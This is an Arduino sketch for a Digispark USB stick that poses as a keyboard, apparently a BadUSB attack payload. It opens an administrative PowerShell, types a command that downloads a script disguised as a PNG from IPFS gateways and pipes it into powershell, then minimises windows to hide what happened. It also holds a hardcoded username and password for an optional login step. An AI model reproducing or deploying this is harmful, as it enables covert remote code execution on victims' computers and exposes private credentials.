#include "DigiKeyboard.h"
#include "./VAR.h"

#define DOMAINS "'ipfs.io','cloudflare-ipfs.com','ipfs.karmanyaah.malhotra.cc'"

const bool login = 0;
void setup() {
  pinMode(1, OUTPUT); //LED on Model B
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(500);
  digitalWrite(1, LOW);
}



int done = 0;
void loop() {
  if (done >= 1) {
    digitalWrite(1, HIGH);
    return;
  }

  DigiKeyboard.sendKeyStroke(KEY_ESC);
  DigiKeyboard.sendKeyStroke(KEY_ESC);
  DigiKeyboard.sendKeyStroke(KEY_ESC);
  DigiKeyboard.sendKeyStroke(KEY_ESC);
  DigiKeyboard.delay(500);

  if (login) {
    DigiKeyboard.delay(500);
    DigiKeyboard.println("\t\t\t");
    DigiKeyboard.delay(500);
    DigiKeyboard.print("karmanyaah.malhotra");
    DigiKeyboard.print("\t");
    DigiKeyboard.println("belton78150");
    DigiKeyboard.delay(40000);//60 sec - 20sec
  }

  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_I);
  DigiKeyboard.delay(3000);

  DigiKeyboard.print(F("foreach($_ in @("DOMAINS")){wget -v -Ti 6 https://$_"LINK" -O ~/oreo2.png;if($?){cat ~/oreo2.png | powershell;break}};exit\n"));

  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);

  done++;
}
